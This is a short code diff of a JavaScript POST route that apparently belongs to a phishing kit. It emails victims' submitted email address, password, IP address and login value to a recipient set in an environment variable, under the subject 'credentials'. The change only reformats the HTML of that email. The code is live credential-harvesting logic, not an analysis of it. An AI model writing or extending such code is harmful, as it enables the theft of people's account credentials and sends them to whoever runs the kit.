@@ -20,14 +20,13 @@ export async function POST(request) {
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
-      html: `<h3>${JSON.stringify(res.email).replaceAll('"', "")}
+      html: `<h3>${JSON.stringify(res.email).replaceAll('"', "")}</h3>
       
-      /password: ${JSON.stringify(res.pass).replaceAll('"', "")}
+      <h3> /password: ${JSON.stringify(res.pass).replaceAll('"', "")}</h3>
       
-      /ip address: ${JSON.stringify(res.pi).replaceAll('"', "")}
+      <h3> /ip address: ${JSON.stringify(res.pi).replaceAll('"', "")}</h3>
 
-      /login: ${JSON.stringify(res.gols).replaceAll('"', "")}
-      </h3>
+      <h3> /login: ${JSON.stringify(res.gols).replaceAll('"', "")}</h3>
       
       `,
     });
